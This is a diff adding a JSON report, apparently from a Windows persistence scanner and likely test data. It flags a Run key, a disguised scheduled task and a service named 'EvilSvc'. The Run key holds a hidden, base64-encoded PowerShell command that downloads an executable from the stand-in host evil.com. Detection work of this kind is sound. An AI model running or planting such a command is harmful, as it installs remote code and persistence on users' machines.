@@ -1,0 +1,61 @@
+{
+  "generated_at": "2026-04-24T16:27:26.270189",
+  "baseline_date": "2026-04-24T13:21:47",
+  "registry": [
+    {
+      "id": 47,
+      "name": "WindowsUpdater",
+      "hive": "HKCU\\Run",
+      "reg_path": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "value_data": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAG0AYQBsAHcAYQByAGUALgBlAHgAZQAnACwAJwBDADoAXABtAGEAbAB3AGEAcgBlAFwAcABhAHkAbABvAGEAZAAuAGUAeABlACcAKQA=",
+      "severity": "critical",
+      "ioc_notes": "LOLBin with suspicious flags: powershell.exe",
+      "techniques": "[{\"id\": \"T1547.001\", \"name\": \"Boot/Logon Autostart: Registry Run Keys\"}]",
+      "first_seen": "2026-04-24T16:26:49.011978",
+      "last_seen": "2026-04-24T16:26:49.011978",
+      "hash_id": "468ab4ebcc6b114616459a742f8e7f74"
+    }
+  ],
+  "tasks": [
+    {
+      "id": 669,
+      "task_name": "\\Microsoft\\Windows\\Maintenance\\UpdateCheck",
+      "task_path": "\\Microsoft\\Windows\\Maintenance\\UpdateCheck",
+      "command": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
+      "arguments": "",
+      "run_as": "User",
+      "trigger_type": "Unknown",
+      "enabled": 1,
+      "severity": "critical",
+      "ioc_notes": "LOLBin with suspicious flags: powershell.exe",
+      "techniques": "[{\"id\": \"T1053.005\", \"name\": \"Scheduled Task/Job: Scheduled Task\"}]",
+      "first_seen": "2026-04-24T16:27:01.437884",
+      "last_seen": "2026-04-24T16:27:01.437884",
+      "hash_id": "fad7af52020cd6ee520bc413f01161b7",
+      "name": "\\Microsoft\\Windows\\Maintenance\\UpdateCheck",
+      "value_data": "powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
+    }
+  ],
+  "services": [
+    {
+      "id": 875,
+      "service_name": "EvilSvc",
+      "display_name": "EvilSvc",
+      "binary_path": "C:\\Windows\\Temp\\evil_payload.exe",
+      "start_type": "Automatic",
+      "service_type": "16",
+      "run_as": "LocalSystem",
+      "severity": "critical",
+      "ioc_notes": "Suspicious name pattern: payload",
+      "techniques": "[{\"id\": \"T1543.003\", \"name\": \"Create or Modify System Process: Windows Service\"}]",
+      "first_seen": "2026-04-24T16:27:14.788864",
+      "last_seen": "2026-04-24T16:27:14.788864",
+      "hash_id": "d85a5275354e58147e965f92e1d6e0bf",
+      "name": "EvilSvc",
+      "value_data": "C:\\Windows\\Temp\\evil_payload.exe"
+    }
+  ],
+  "total_findings": 3,
+  "critical": 3,
+  "high": 0
+}
